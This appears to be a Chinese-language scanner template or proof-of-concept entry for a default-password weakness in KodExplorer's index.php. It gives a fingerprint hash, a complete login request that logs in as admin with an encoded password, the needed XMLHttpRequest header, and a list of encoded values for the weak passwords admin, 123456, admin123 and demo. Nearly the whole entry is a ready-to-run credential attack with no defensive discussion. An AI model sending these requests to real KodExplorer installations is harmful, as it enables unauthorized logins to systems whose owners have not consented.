# KodExplorerindex.php存在弱口令漏洞

- **系统**：KodExplorerindex.php　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`"XuUvDMYOVL9Q/ULYCpDj+Q=="`
- **请求**：`GET /index.php?user/loginSubmit&name=admin&salt=1&checkCode=undefined&password=hl7dg43c2zTBLAGqrvTW2e3_bNsndvw6NV33I2RxBHotRQt_bQw&rememberPassword=0&isAjax=1 HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
弱口令对应解码值
#hl7dg43c2zTBLAGqrvTW2e3_bNsndvw6NV33I2RxBHotRQt_bQw  admin
#nky4Xde4fG1tKESNFe7gv9Zx4aEo7XW39edizMky1nv2JtdyMjn8  123456
#n4OUb94feaGDUeqhP3QebjbwTSiwMhno34ZFWyz2OAnhWiz7rRbZ-oQ  admin123
#qG9Xs6afd3Sd7p24zOsoUMVbZd_bQg4726FUUfkthO_dXZIb7  demo
```
- **预期**：200　|　use_time